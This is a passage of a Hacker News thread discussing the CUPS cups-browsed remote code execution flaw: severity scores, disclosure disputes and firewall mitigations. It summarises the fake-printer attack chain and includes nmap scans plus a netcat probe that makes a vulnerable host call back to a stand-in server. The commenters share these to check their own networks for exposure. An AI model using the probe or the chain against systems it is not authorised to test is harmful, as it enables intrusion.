service, but it's rather annoying how more and more software spirals out of scope and makes components that could be optional a requirement. Very related is avahi-daemon. Take a desktop Debian/Ubuntu and try to uninstall it; there's a good chance it's going to remove a couple other software where you wonder why avahi would be a hard dependency. reply DanMcInerney 22 hours agoprevDepending on your interpretation of the Scope metric in CVSSv3, this is either an 8.8 or a 9.6 CVSS to be more accurate. In summary, there's a service (CUPS) that is exposed to the LAN (0.0.0.0) on at least some desktop flavors of Linux and runs as root that is vulnerable to unauth RCE. CUPS is not a default service on most of the server-oriented linux machines like Ubuntu Server or CentOS, but does appear to start by default on most desktop flavors of linux. To trigger the RCE the user on the vulnerable linux machine must print a document after being exploited. Evilsocket claims to have had 100's of thousands of callbacks showing that despite the fact most of us have probably never printed anything from Linux, the impact is enough to create a large botnet regardless. reply funcDropShadow 22 hours agoparentUniversities are full of people with Linux desktops with public IPs and that are printing all the time: papers, their own and other's. reply DanMcInerney 22 hours agorootparentYes, good point, university networks are particularly vulnerable. reply creatonez 11 hours agorootparentGreat opportunity to expand the Sci-Hub effort /s reply znpy 20 hours agorootparentprevHaving a public ip address doesn't always mean there's no firewall in between a pc and the public internet, ideally with sensible default rules. It's not 1996. And sorry if I'm being a bit harsh on this, but this point comes up every time when ipv6 is mentioned, by people that clearly don't understand the above point. reply lights0123 13 hours agorootparentJust to add a datapoint to the previous comment, my large public US university hands out public IPs to every device on WiFi. If there is a firewall, it doesn't block 8080 or 22. reply tsimionescu 13 hours agorootparentprevThe point is that, if printing works for those people, then we know they have this port open, at least on the university network. So even if it's not exploitable over the internet, it's definitely exploitable from the whole university network, which is almost as good as from the internet. reply globular-toast 11 hours agorootparentprevYes. It's rather sad that so many people equate NAT with a firewall. Two totally different things. A firewall is good, NAT is annoying. We need to push IPv6 harder. reply guenthert 8 hours agoparentprevUh, Linux desktops have a marketshare of some 4.5% (excluding ChromeOS which isn't affected). Even if most of us don't print (I haven't in the last year and little in the previous five), that will still be a lot of print jobs emitted by Linux hosts. reply mort96 11 hours agoparentprevHow can this be a 9.6 when heartbleed was a 7.5, how can it be just 0.4 below the xz thing reply Ekaros 8 hours agorootparentBecause scores are kinda bullshit. But real answer is well if you have arbitrary remote code execution you can also read memory, where as heartbleed only read memory... And the reality is same, you were safe from heartbleed if you did not use openssl, you are safe from this if you do not use cups. CVSS score does not take into account if the software is used or not. reply mort96 6 hours agorootparentI guess a part of the issue is that it was reported as a \"9.9 severity vulnerability in Linux\" in a bunch of places, which makes it sound incredibly severe, whereas a \"9.9 severity vulnerability in CUPS\" doesn't reply marcodiego 22 hours agoprevResuming: 1 - cups-browsed is able to install printers automatically (without the requirement of user confirmation) by listening to UDP packets on port 631. 2 - Attacker uses this \"feature\" to install a fake printer with a custom driver (which is also installed without user confirmation and can be downloaded from an arbitrary host) which specifies the \"command to run\" when a print job is sent. 3 - User prints something in the fake printer and the \"command to run\" is executed. reply hypeatei 21 hours agoparent> without the requirement of user confirmation I suppose CUPS was introduced in 1999 so it probably made sense then. But why is it still a thing today? reply znpy 20 hours agorootparentI would rather expect this kind of change came later, when there has been a huge push to make the \"linux desktop\" more user-friendly. 1999 sounds like the time when people were a bit more expected to mess with config file and somehow always had a root terminal around. If anything, keep in mind that in 1999 it was still a rite of passage to have to learn how to write the X11 configuration file (what used to be xorg.conf) reply acdha 6 hours agorootparentI’d shift that a little earlier (XF86 autoprobing worked for a lot of hardware by the turn of the century) but especially also recognize the competitive environment. Mac, Windows, OS/2, etc. users had been using local network discovery since the 80s, and the people trying to popularize Linux on the desktop were all too aware of the “by and for computer nerds” reputation they were trying to shake, and a lot of people still thought about corporate networks as isolated enclaves where nothing too dangerous happened. The threat model for a lot of people, even server admins who should have known better, was more along the lines of “someone will print a picture of their butt on your desktop printer” rather than “your workstation is now being used to attack the accounting system”. reply a96 11 hours agorootparentprevUsed to be XF86Config (even on non-*86). Xorg came in something like 2005. These things are really pretty young still. reply ruuda 22 hours agoprev> That a lot is expected and taken for granted from the security researchers by triagers that behave like you have to “prove to be worth listening to” while in reality they barely care to process and understand what you are saying The unfortunate reality is that for every well-researched report like this one, you get 57 low-effort spam reports that hope to extract a bug bounty reward, or get a CVE discovery listed on their resume. Especially with the rise of LLMs that kind of spam can easily trick you. It's a sad situation, but I don't entirely blame developers for being skeptic. reply hypeatei 21 hours agoparentcurl developers deal with this exact thing[0] (AI generated security reports) 0: https://daniel.haxx.se/blog/2024/01/02/the-i-in-llm-stands-f... reply cvhc 21 hours agoprevWhile in this case distros include cups-browsed maybe as a feature, I always feel it's a bad thing Ubuntu/Debian (and maybe all deb-based distros?) automatically bring up almost all services upon installation. This means you can install a package and accidentially open another network service that's installed as a dependency. You probably already know exim4 (to be fair it listens to only localhost by default, so maybe not a big deal). I just tried to install cups-browsed on one of my Debian machine, and it brought up two services that listens to 0.0.0.0 (cups-browsed and avahi). This is not the case for Arch/Gentoo and CentOS-like distros. reply dfc 22 hours agoprevThe original CVSS score on Twitter indicated that user interaction was not required. However reading the RCE chain on the page says: Wait for a print job to be sent to our fake printer for the PPD directives, and therefore the command, to be executed. If Alice never hits print it seems like a print job will never be triggered. Am I missing something? I'm not questioning evilsocket, I'm trying to check my understanding. reply rini17 22 hours agoparentThere are also buffer overflows which they detected with fuzzer, which can be turned into RCE without requiring user interaction. But author did not have enough expertise in this area to create actual exploit for these. reply cjbprime 21 hours agorootparentIt is untrue that every buffer overflow can be exploited. We won't know whether these can be until someone tries. reply playingalong 22 hours agoparentprevIt depends on the definition of \"interaction\". AFAIU Alice doesn't need to print anything supplied by the attacker. It's enough if she prints anything. reply dfc 21 hours agorootparentI agree that Alice just needs to print anything but that seems like user interaction required. Its also not clear if Alice has multiple printers defined does it matter which printer she selects? reply tsimionescu 13 hours agorootparentThe attacker can replace any and all printers, so not entirely. I'm not sure how the UI part of CVSS is specifically defined, but I think it's at least somewhat fair to call something the user is expected to do unrelated to the attack in any way \"no interaction\". Otherwise, it's like saying \"the user has to power on their device and turn on their Wi-Fi for the attack to work, so it requires user interaction\". reply acdha 6 hours agorootparentThe question I had is whether the attacker can enumerate known printers, too. Replacement is a lot more damaging if they don’t have to discover the name of your default printer first. The interaction question is complicated because there are three modes: the most damaging is when the attacker can trigger the exploit directly, since that’s where we start seeing worms and other untargeted attacks. The next level is where the attacker can exploit something the user normally does - hence the question about default printer replacement since that is something the user has done many times before and thinks of as safe. The lowest level of risk would be if they need to get you to click on a different printer: still bad but nowhere near as easy to exploit on a large scale. reply kccqzy 21 hours agorootparentprevShe needs to print something using the fake printer. Nothing happens, IIUC, if Alice chooses to print a document with a real printer. reply cjbprime 21 hours agorootparentThe attack can overwrite the real printer with a fake one. reply kccqzy 21 hours agorootparentWhere did you see that? reply remram 20 hours agorootparentCtrl+F \"replace\" reply djordanzachvsd 21 hours agorootparentprevin the middle of the alley reply bborud 22 hours agoprevEvery time I need to print something on MacOS I am reminded of how much I hate printers and any printer related software. I've been messing around with computers for 40 years now and goddamnit, every decade printers become more of a pain in the neck. reply Joker_vD 22 hours agoparentFunny how the whole FSF movement started in no small part because Stallman was irritated with the low quality of printer drivers... and how that movement for some (?) reason failed, in 40 years, to noticeably improve the quality of printer-related software. reply playingalong 22 hours agorootparentBut at least we got all the byproducts. reply linuxlizard 22 hours agoparentprevI wrote printer code for 10+ years. I appreciate how hard the technical problems are but vendors make it so much worse. I loathe printers. Printers peaked with the LaserJet III. reply sliken 17 hours agorootparentAgreed, I ran several busy printers for a large department. The ljet IIIs were work houses and ran nearly forever if you used the recommended part replacement schedule. We had a ljet III that outlasted ljet 4, ljet 5, and ljet 4000. Ljet 3 was the last with the HP print engine, afterwards they used Canon print engines. The network interface was brittle, even a nmap would hang the printer. So we firewalled it off and used CUPS to handle postscript -> PCL. Sending only PCL to the printer (postscript memory and CPU is unbounded) made them faster and MUCH more reliable. reply gruturo 21 hours agorootparentprevIIRC the Laserjet 4 had a much better warm-up time (and lower power consumption) by switching to a thin ceramic heating element rather than heating half the printer. But yeah anything after that is downhill. reply bborud 10 hours agorootparentprevIt would be helpful to understand exactly which layers in the stack you think of as technically difficult. reply niwtsol 21 hours agorootparentprevdo you mind lightly summarizing what technical problems make it more difficult? I'm assuming there are all sorts of things web-devs never even think about from that world. reply sliken 17 hours agorootparentPoor status, often a 1 line LCD says \"processing...\" and hangs infinitely. Different handling of duplex, monitoring ink levels, file formats (PS? EPS? PNG? PCL? Which versions? Etc). Issues with ink that expire by date, reduced functionality with 3rd party inks, not being able to print black even when only yellow is out of ink. Different postscript versions and the nature of a language where CPU and memory use is unbounded means you get a nightmare of which files can print to which printers. Most of our printer nightmares, at least the software issues, ended when we handled postscript -> PCL (a raster based format) on the server side. reply cryptonector 21 hours agorootparentprevEvery printer vendor does things differently, every printer has different constraints and options? Too many standards? reply op00to 22 hours agoparentprevI feel like printers are far better now than they were 10 years ago. At least on MacOS and iOS, I have no problems finding a printer and printing. 10 years ago it was a pain, but now - smooth sailing for me. Heck, no driver installs either! reply cp9 22 hours agorootparentprinting even works on linux now, thanks to stuff like Airprint and the support for it in CUPS reply Jach 21 hours agorootparentYeah something like 10-15 years ago I thought for just the simple action of printing a file, it was way easier in Ubuntu than Windows, simply because they included a lot of drivers in the distro by default, while in Windows land I still had to visit the printer manufacturer's website for drivers -- or use the included CD! I try to avoid needing to do anything more complex than that. (Scanning I've always done with a USB stick plugged directly into the printer.) Things kind of got worse again in recent years with the removal of the standalone GUI for administration in favor of a web interface, and various ongoing modularization efforts, in theory cups3 will work even better and only support IPP/AirPrint: https://openprinting.github.io/current/#the-new-architecture... reply arp242 5 hours agoparentprevI used to have a dot-matrix printer from the 80s. I could print with \"cat file.txt >/dev/lpt0\". It was amazing. Didn't do Unicode unfortunately, and monospace only, and no bold and stuff like that. But still the best printer I've ever owned. reply trickstra 13 hours agoparentprevJust in: HP is adding AI into printer drivers (no joke: https://hardware.slashdot.org/story/24/09/27/0030239/hp-is-a...) reply pushupentry1219 17 hours agoparentprevYou lose job control, but I've just done a netcat to a port on my printer with my document converted to PostScript and it works fine pdf2ps-nc9001 reply cryptonector 21 hours agoparentprevDo you remember those portable sh-coded HP JetAdmin printer drivers? Are you saying things today are worse than that? reply sliken 17 hours agorootparentHeh, I've heard complaints about multi GB driver installs on windows, sounds worse to me. reply farhanhubble 19 hours agoprevIrrespective of the severity assigned it's a good and simple case study for any programmer, engineer or not, building drivers and low-level stuff or not. Alongside it, and the iconic \"Smashing the Stack for Fun and Profit\", reading \"The Bugs We Need to Kill\"[1], makes a programmer much more aware that every program is prone to manipulation via its inputs. [1]: https://www.usenix.org/system/files/login/articles/login_aug... reply nottorp 6 hours agoprev> After some googling I found out that cups-browsed is indeed part of the CUPS system and it is responsible for discovering new printers and automatically adding them to the system. Very interesting, I had no idea Linux just added anything found on a network before the user can even accept or be notified. The more you know! I don't know, last time i bought a new printer i plugged it into my LAN and my Apple machines automatically showed it to me and I could print to it. Why blame Linux? reply spookie 22 hours agoprevOf course its CUPS. Saying it affects all \"Linux\" systems is just wild. Imagine even having that thing on your system to begin with. reply Jach 21 hours agoparentI can't imagine it on a normal server expected to serve public internet requests. The way you phrased that though makes me wonder for desktop use, is there a non-cups alternative to printing on linux these days that's gone under my radar? (Please don't say there's a systemd-print...) If nothing else, probably another overdue candidate for the energetic rewrite-it-in-Rust people. reply yjftsjthsd-h 22 hours agoparentprevI'm more interested in whether some/all of these work on macOS, which is probably a bigger target. reply jkaplowitz 19 hours agorootparentOP has promised to discuss macOS in part 2 of this blog post series. So sounds like the answer is yes. reply Tiberium 22 hours agorootparentprevhttps://github.com/OpenPrinting/cups-browsed/issues/36#issue... makes it sounds like most of them don't, and even if they do, it's sandboxed. reply outworlder 20 hours agorootparentThere may be something else for that. > In part II of this series (date TBD since there’s another disclosure in process), we’ll see how to use these new bettercap modules (not yet released) to attack Apple macOS. reply wannacboatmovie 17 hours agoparentprev> Imagine even having that thing on your system to begin with Well it is the Common UNIX printing system... If it was the Not-oft-used Printing System I could understand. reply spookie 8 hours agorootparentFair, I just don't print usually. Didn't think the phrase through too much. Sorry about that. I've talked about alternatives in another reply, they do not offer the same flexibility as CUPS however. reply EasyMark 11 hours agoparentprevWhat’s wrong with having CUPS on your system if you actually use a printer? I’m kind of lost as the source of the “imagine”? reply pxc 10 hours agorootparentThat commenter is probably just someone who has never used anything but Windows on the desktop. reply spookie 8 hours agorootparentI run Linux and have been for 10 years. There have been many vulnerabilities with CUPS over the years and its generally known as being risky. There at printers that let you send a pdf directly to their ip address, ones that take in usbs, etc... CUPS does a lot of things, but for desktop use do you really need everything? I personally haven't printed anything for a long time, so I might've been biased in my reply. So, I'm sorry if the comment was a too generalized. As another thought, why does it come by default on most distros given its history? reply wakawaka28 14 hours agoparentprevWhat would you use instead? reply doubled112 22 hours agoparentprevI'm certainly not regretting disabling avahi and cups-browsed on all of my systems long ago. Do people have printers that move around all the time? Also, firewalls on desktops and laptops for the win, yet again. reply robinsonb5 21 hours agorootparent> Do people have printers that move around all the time? I suspect it's not the printers that are moving, but the laptops. reply doubled112 20 hours agorootparentFair, but do people print away from home very often? I’ve never printed anything outside of home since high school, but maybe I’m an outlier. Maybe a better question, would intentionally adding a printer at home and a printer at the office be that large a barrier? Maybe we wouldn't even need to drop auto discovery. Maybe it could work more like Bluetooth and only broadcast or accept connections while it was actively searching. reply kayodelycaon 18 hours agorootparentIf you mean use someone else’s printer, I do it occasionally. Usually TTRPG character sheets. I am so happy AirPrint is common now. Makes my life easier. If you mean send something from outside of my house to my house, I’ve done using a vpn. reply sprayk 22 hours agoprev> I had no idea Linux just added anything found on a network before the user can even accept or be notified. The more you know! Windows does this too, I believe. At least it did it with a Xerox laser printer I bought and the Brother printer at my friend's place. reply tsimionescu 12 hours agoparentWindows does have a significant mitigation: whenever you connect to a new network, such as a coffee shop Wi-Fi, it defaults to considering this network Public (untrusted) and firewalls any such services from accessing it/being accessed from it. You have to explicitly set it as a \"Private\" network for file sharing and printer discovery and similar to work. reply ruthmarx 18 hours agoprevThis is a ridiculously over hyped vulnerability, the most over-hyped I've seen in a long time. Still, kudos to the author who found it, it's going to definitely be a career boost with all the world is ending headlines. reply tsimionescu 12 hours agoparentIt's probably somewhat overhyped, but it's still a really really bad vulnerability for virtually all Linux desktops, even as presented. It's a persistent compromise of your printing system that can happen to your default Linux installation by just connecting to the same wifi/LAN as an attacker, and triggered at any point later when you print something. And it's very likely that someone will find a way to exploit it with a buffer overflow without even having to wait for the user to print something. reply dottedmag 12 hours agoparentprevWill it? The author goes to my «do not hire / hype-eater» list for sure. reply ruthmarx 2 hours agorootparentThe author isn't really the one over-hyping it. reply bbarnett 10 hours agorootparentprevSame here. I don't need people overstating issues working for me. I'd never be able to trust anything this person says, in terms of priority. Literally making things up, screaming his head off, crying wolf, \"all linux systems\" my ass. A horrible person. You know some people actually take security seriously? Not this guy. It's all a personal hype vector. reply peanut-walrus 20 hours agoprevTried it out, looks like at least on Debian the filter gets invoked with limited user privileges, so not world-ending, but still bad. And it does require user interaction, but my gut feeling is that this can be bypassed with some cleverness. However, this is only for this particular exploit. The behaviour where cups-browsed automatically downloads and installs printers from random untrusted places on the internet is insane, especially as it does it for all printers it discovers on the local network by default. At minimum anyone on a LAN can cause a DoS type attack against all Linux workstations on the same LAN by just advertising a few million printers via zeroconf. reply whywhywhywhy 22 hours agoprevFrom DEFCON 1 to “it’s absolutely nothing” in 5 hours reply ugjka 16 hours agoparentyeah i thought it was going to be something in tcp stack reply scblock 22 hours agoprevThis is a lot less \"exciting\" than the LOOK AT ME MOM I MADE AN EXPLOIT social media posts implied. reply thinkingemote 22 hours agoparentPossibly because the devs reduced the numbers he says: \"because the devs just can't accept that their code is crap - responsible disclosure: no more\" Always kind of worrying to see vulnerability researchers justifying bad behaviour because they find a vulnerability in code. Maybe it was because his pride was hurt that he threw away any ethical behaviour? reply oskarkk 20 hours agorootparentIs that an exact quote? He says that he disclosed it now because there was a leak and \"all vendors that bothered participating agreed on today at 20:00 UTC\". https://x.com/evilsocket/status/1839433162168181051 Anyway, I don't like his tone and he's overreacting imo. reply 0x_rs 20 hours agorootparent>Is that an exact quote? It is. https://x.com/evilsocket/status/1838169889330135132 reply Sohcahtoa82 21 hours agorootparentprev> vulnerability researchers justifying bad behaviour because they find a vulnerability in code This is an extremely bad faith take that makes me irrationally angry to read. He's not using bad code as a reason to engage in bad behavior, he's using bad responses to responsible disclosure. Read the section under \"Personal Considerations\". It only took him two days to find the problem, but 22 days to get developers to admit there's a vulnerability, even when shown PoCs. Imagine finding a vulnerability, responsibly disclosing it, being told \"meh, not an issue\", responding with a PoC showing full code execution, and still being told \"meh, not an issue\". reply thinkingemote 21 hours agorootparent> Imagine finding a vulnerability, responsibly disclosing it, being told \"meh, not an issue\", responding with a PoC showing full code execution, and still being told \"meh, not an issue\". I would still want to be responsible. I shouldn't get to choose to be irresponsible when I have a bad experience. Then, naturally when the time is up and the disclosure happens according to the timetable, I would be the side looking much the better from it. As such behaving as he did and justifying it in that way is illogical. I speculate that maybe the reasons he gave may not be entirely the whole story because he would have looked better responsibly disclosing, but its important to note that he doesn't blame poor code, thank you for the correction. And I am speculating for the reasons. Maybe in the future I shouldn't. reply SAI_Peregrinus 6 hours agorootparentResponsible Disclosure has two forms: Coordinated disclosure where the vuln is disclosed to the vendor with a time limit for public disclosure. Full disclosure, where the vuln is disclosed to the public so they can take mitigation steps. Irresponsible disclosure is selling the vuln to criminal groups or intelligence agencies. reply Sohcahtoa82 21 hours agorootparentprevDisagreeing with someone's decisions is not a valid justification for misrepresenting their motives. I agree with you, it's kinda shitty, but I get where he's coming from. It's incredibly frustrating to want to improve the security of the world, but when developers have too much ego and push back against claims of vulnerabilities in the face of proof, well...every hero either dies or lives long enough to become the villain. I've experienced it first-hand at a previous job. I found a buffer overflow in some firmware, and engineering just said \"Meh, at worst you'll just segfault the device, and the user can just reboot\". The fix would have literally just been a two-line buffer length test that throws a 400 Bad Request (It was an embedded web server written in C, with the vuln being in an XML parsing library), but I had to go through the effort of taking that bug and learning ARM assembly and return-oriented programming in order to create a PoC before engineering decided to fix it. I suppose I should be happy, though, as that learning experience was the cannon that shot me from just being a test engineer into getting into AppSec. reply whydoyoucare 18 hours agorootparentI genuinely liked your opening statement (disagreeing...) I am sorry to hear you had such a raw experience. Maybe you were dealing with pretty clueless engineers, since most do realize a buffer overflow should be treated exploitable unless proven otherwise. I've had better experience trying to argue the cost of fix -- it being pretty low was incentive enough for engineering to fix it. That said, I am worried evilsocket may not be taken seriously next time he finds a vulnerability with CVSS 9.9. To some extent I am surprised by his argument on not knowing CVSS scoring rubrik. There may have been language barrier at play as well, leading to some of his sentences coming across as more abrasive than they should have been. reply thinkingemote 21 hours agorootparentprevYes, I can totally empathise with him too. I've behaved in emotional ways in with frustration because of code (but thankfully not in a public way with certain standards of behaviour). Let's hope he can learn from it. It's hard to act professional when acting alone and outside and against the so-called \"real professionals\". Ultimately it's about trust. Perhaps these organisations have become too large and uncaring or maybe we have become too impatient and frustrated. I don't think anyone wants to see researchers not responsibly disclosing as well as companies irresponsibly interacting with external researchers who just want to help. It's easy to this as a path from white to black hat. reply tsimionescu 12 hours agoparentprevMaybe less exciting, but still terrible for almost anyone running a Linux desktop/laptop, especially those that expect it's safer than a Windows desktop. And it's a really bad look both for the developers of CUPS, and for most Linux distros, including RHEL, that just enabled this printer discovery backdoor by default without any mitigations in place. reply gquere 11 hours agorootparentOn RHEL it's installed but it's not enabled by default. reply LZ2DMV 21 hours agoprevEveryone, please go to your respective data centers, locate your rack and unplug the printer from the server. reply eadmund 8 hours agoparentNot every Linux machine is a server! This is kind of a big deal for desktop and even more so for laptop users. reply computer23 21 hours agoprevIs there a recommended (best practice) way to nmap scan your network for vulnerable machines, just to be safe? From Red Hat's statement: > Red Hat rates these issues with a severity impact of Important. While all versions of RHEL are affected, it is important to note that affected packages are not vulnerable in their default configuration. Basically, Red Hat machines aren't vulnerable unless \"the cups-browsed service has manually been enabled or started.\" https://www.redhat.com/en/blog/red-hat-response-openprinting... reply pushupentry1219 17 hours agoparentCorporate organisations make use of platforms like Nessus/Tenable to provide this continuous vuln scanning for compliance reasons. Under the hood its basically running an nmap scan and spitting out a PDF report. reply nobody9999 21 hours agoparentprev>Is there a recommended (best practice) way to nmap scan your network for vulnerable machines, just to be safe? Perhaps something like this? nmap -sU -p 631 -P0 [network]/[mask] Edit: Added [network]/[mask] for completeness. reply moyix 19 hours agorootparentnmap can't really tell the difference between an open or a firewalled UDP port. For this specific vuln you can send it a packet like: echo \"0 3 http://myserver:PORT/printers/foo\"nc -u target 631 And if the target is running CUPS on that port it will reach out to `myserver:PORT` and POST some data. The downside is you need to have a server running that can accept inbound requests to see if it connects back. reply folmar 18 hours agorootparentYou can use --data in nmap to send it easily to the range of hosts (but the server is still needed). reply nobody9999 18 hours agorootparentprevA fair point, although nmap does list results as \"closed\", \"open\" or \"open/filtered\". Which can be ambiguous if the port is open or firewalled. However, if the nmap reports that port is \"closed,\" it most likely is: Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-26 20:02 EDT Nmap scan report for [host] (localip) Host is up (0.00084s latency). PORT STATE SERVICE 631/udp closed ipp I'd add that GP specifically requested an nmap command. All that said, you're absolutely correct and if nmap returns something like this: Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-26 20:04 EDT Nmap scan report for [host] (localip) Host is up (0.00058s latency). PORT STATE SERVICE 631/udp open|filtered ipp then further poking could be required, as you suggest. I would point out that cups-browsed isn't really necessary unless you desire to have printers automatically added without any user interaction. Which is poor opsec in any situation. If we're talking about a corporate environment, adding printers can be automated without cups-browsed, and at home or in the wild (cafes, public wifi, etc.) that's an unacceptable (at least from my perspective) risk and printers (if needed in such an unsecured environment) should be explicitly added by the user, with manual checks to ensure it's the correct device. As such, rather than checking to see if cups-browsed is running unsecured, simply check to see if it's installed: Debian and variants: 'sudo apt list --installedgrep cups-browsed' RedHat/Fedora and variants: 'sudo rpm -a -qgrep cups-browsed' And if it is, remove it. Edit: fixed typo. reply a96 10 hours agorootparentSurely you don't need sudo for listing with either apt or rpm. reply blueflow 10 hours agoprevThere used to be a timeframe (before like 2020) where you could use network printers without any extra software: Open your Document in Firefox, print to postscript, and then netcat that postscript to your network printer port 9100. This is the \"AppSocket\" protocol. Unfortunately, Firefox removed that feature, and port 9100 is now clobbered by the Prometheus node exporter. If you accidentally add a AppSocket capable printer to Prometheus it will print out HTTP headers every other minute. The good times are over, but on the other side, having to print something has gotten quite rare. reply akvadrako 10 hours agoparentNow we have something better, IPP everywhere. The protocol isn't as simple as netcating a postscript, but is simple enough, standardized and does everything expected for printing. reply blueflow 9 hours agorootparentIs there a implementation for Linux that isn't cups? reply akvadrako 8 hours agorootparentThere are a few clients here: https://github.com/topics/ipp It's not hard to write a client library / CLI, it's just there isn't much interest. reply smokel 22 hours agoprevThis vulnerability seems to be pretty hard to actually exploit, but for those of you who are running Ubuntu on their desktops, consider enabling a firewall, which is as easy as: sudo ufw enable Beats me why this is not the default. reply tsimionescu 12 hours agoparentJust enabling the firewall is not enough. The Ubuntu distros explicitly wanted to allow the vector for this vulnerability: the whole purpose of having cups-browsed installed is to allow LAN printers to advertise themselves to your system. reply hypeatei 21 hours agoparentprevAlso this: > sudo ufw deny 631 > sudo ufw reload reply usr1106 1 hour agorootparentdeny 631 is not needed. The default is deny as soon as the firewall is enabled. Tested on Ubuntu 22.04. reply remram 20 hours agorootparentprevreload is unnecessary if you make changes via the command line. reply acdha 6 hours agorootparentMaybe, but it’s good practice to verify that your reload is clean when you are actively working on it. reply remram 3 hours agorootparentIf by \"working on it\" you mean \"changing configuration files\"... \"Good practice\" is never an argument btw. \"It's good practice\" means arguments exist, it is not an argument. reply nirui 8 hours agoprevMaybe the report was overblown, but I found it amusing that CUPS related facilities is shipped and activated by default in a lot of Linux distros (including Gnome Fedora in my case). I've never printed anything on this computer and yet there is this `cupsd` process running as root and listening TCP port 631 on local interface. OK, sure, the program itself maybe safe (enough to run with root while listening a local port that everybody uses this computer can access), but is it really THAT evil if you don't run it 24/7 and instead only enable it when the user is actively using it? reply jonjojojon 22 hours agoprevI am slightly confused. If I am using a linux laptop with cups do I need to do anything besides update? Is there a sane way to print from the linux desktop. I unfortunately need to regularly print, and often from public wifi. reply tsimionescu 12 hours agoparentUnless you need printer discovery, you should probably shut down and remove cups-browsed entirely. Its whole purpose is to listen on the LAN to discover printers (or attackers) that advertise themselves to it. reply LinuxBender 21 hours agoparentprevUnless you are exposing CUPS to other people on purpose so that you act as a print server then block inbound access using a local firewall. Your local print jobs should be able to use the loopback just fine. Your print spooler would then be talking to the IP on your printer and that should also be confined to your local network and may have optional features to further secure access. On a very loosely related note, some enterprise printers have optional features to lock down remote access to people that are authenticated. Authentication capabilities vary by vendor. This is somewhat unrelated to CUPS but probably a good time for people to research what their printers can do as printers are a great way to steal company secrets. [Edit] What smokel said. They beat me to it before I refreshed the page. reply tsimionescu 12 hours agorootparentThis is a misunderstanding of the vulnerability. The problem isn't with the print server. It is with the printer discovery mechanism, cups-browsed. That is the service that listens on the entire network, because it's designed so that LAN printers can advertise themselves to your system. reply LinuxBender 1 hour agorootparentIn that case one can disable it until it is patched assuming there isn't a udev rule that re-enables it. I stay clear of systemd these days so I don't know. reply smokel 22 hours agoparentprevNot an expert, but I guess that simply enabling the firewall should avoid most problems related to this vulnerability. In Ubuntu, this can be accomplished with: sudo ufw enable reply jonjojojon 21 hours agorootparentThank you. I was also able to check that 631 is blocked by searching for it in output of sudo ufw show raw. reply hacker_homie 22 hours agoprevI though this was going to be NetworkManager the way they were hyping it up. reply ajdude 22 hours agoprevDo networked printers themselves run CUPS? E.g. a Brother or HP laserjet plugged into a LAN. reply stop50 13 hours agoparentThe last time i checked: no They run their own software, not cups. the one i had was using their own software, if they had used cups it would have much less problems with printing. reply aidenn0 21 hours agoparentprevvulnerabilities are (mostly?) in cups-browserd rather than cups. reply chrononaut 22 hours agoprevQueue everyone going to Shodan and investigating how many systems have port 631 on UDP open.. reply beginnings 22 hours agoprevmy grandparents who are still printing things like its the 90s might be at risk, if they have installed CUPS that is has the president been briefed yet? reply cp9 22 hours agoprevwe should fix this, CUPS is used in a bunch of consumer hardware it's not a complete disaster like it was implied to be though reply 0x_rs 22 hours agoprevI don't believe this warranted all the fearmongering even if the intention was to get more attention to it and a faster resolution process, it's not far from cry wolf. Initial CVE scores are very arbitrary. CUPS is a well-known liability when exposed to unsafe networks. CVSS scores seem far from perfect. The WebP zero-day, a zero-click vulnerability that was being exploited in the wild and affecting nearly every user device made in the past decade, most of which will never be properly patched from it, received an initial 10.0, and decreased to a meager 8.8 (CVSS:3.1, and would be higher using 4.0). reply cjbprime 21 hours agoparentWhy are distros allowing CUPS to listen on all interfaces, then? reply tsimionescu 12 hours agorootparentThe problem isn't CUPS itself, which is not made to listen on all interfaces by default. The problem is the printer discovery service, cups-browsed, which listens for any printer on the LAN (or any attacker anywhere) that advertises itself to it and automatically registers that printer in your system. Whether it's a good idea to have a service like this is highly debatable, but if it is added, it has to listen to all requests from anywhere (and the firewall port for it has to be open), otherwise it's entirely useless. reply stop50 13 hours agorootparentprevmany distros change this to unix sockets or 127.0.0.1 reply udev4096 22 hours agoprevA basic firewall configuration could easily prevent this even if you are running the vulnerable version reply tsimionescu 12 hours agoparentSure, but that is equivalent to removing the vulnerable service entirely and the features it was offering. Listening on port 631 for connections from any machine is the entire purpose of cups-browsed, it's the only way to do automatic printer discovery. If we think the port should be closed, then Ubuntu and the other distros should also remove this service, at least from the default installations. reply EasyMark 11 hours agoparentprevYep SOP is to block all ports that I haven’t personally white listed on all my systems. reply neuroelectron 8 hours agoprevEverybody saying this is nothing burger is absolutely wrong. This is not overhyped. A lot of comments like, well my distro doesn't do this, and well yeah nobody uses printers anymore. A print server is design to be exposed. Office networks will use one and they have important data. You would think there would be some kind of hardening. Honestly, this looks intentional. reply fizlebit 22 hours agoprevIt is bad if you print from a Linux laptop that uses WiFi isn’t it? reply LZ2DMV 21 hours agoparentOnly if the machine is directly connected to the internet and the malicious packet doesn't hit a firewall somewhere along the path. Most laptops connected to Wi-Fi are indeed connected to an AP or a SOHO router that does NAT, so the attacker won't be able to directly reach it and this is a requirement for this to work. reply jonatanheyman 19 hours agorootparentThe attacker can be on the LAN though. reply EasyMark 11 hours agorootparentSure but security isn’t about being 100% protected which is impossible, but lowering your attack foot print. Unless you have a ton of people hooking to your LAN regularly then this still greatly lowers you chances of getting hit with this particular security flaw by people on the WAN reply charrondev 5 hours agorootparentA useful target might be university networks, although IIRC our university printers weren’t available for discovery. Instead we would send our documents to a special email that would forward it to a local print server so we could get charged for it. reply bogwog 22 hours agoprevI remember there was some like viral marketing thing some company did a while back where they had a website where they had a webcam pointed at a printer, and anything printed would go on a conveyer belt and fall into a literal dumpster fire. Users could submit stuff on their website and see it printed and burned live. ...anyways, maybe they were vulnerable to this attack at the time? reply tsimionescu 12 hours agoparentThe attack is about a malicious printer registering itself to your system, not about a malicious system sending print jobs to a real printer. reply pushupentry1219 17 hours agoparentprevThen again, their printer was probably locally-networked and the documents would come in from the webserver and then be passed to the printer. reply pabs3 11 hours agoprevIs printing obsolete yet? reply guluarte 22 hours agoprevThis is nowhere near as severe as the Heartbleed bug. reply Dachande663 22 hours agoprevI suppose the real question now is: did the author give it a 9.9 out of ignorance or malice/ego? reply rini17 22 hours agoparentRedHat did, as per the article reply develatio 22 hours agoprevI'm gonna give this a 10/10 meh. Not up to all the hype that was created around it. reply giovanni_or2 19 hours agoprevThis is a nothing-burger... reply andersa 22 hours agoprevSo just to make sure I understand correctly, this is a nothingburger, right? No important server has a printer attached. Any basic firewall would block this traffic. reply rolph 22 hours agoparentbotnetting is about exploiting unimportant desktops, to create very important 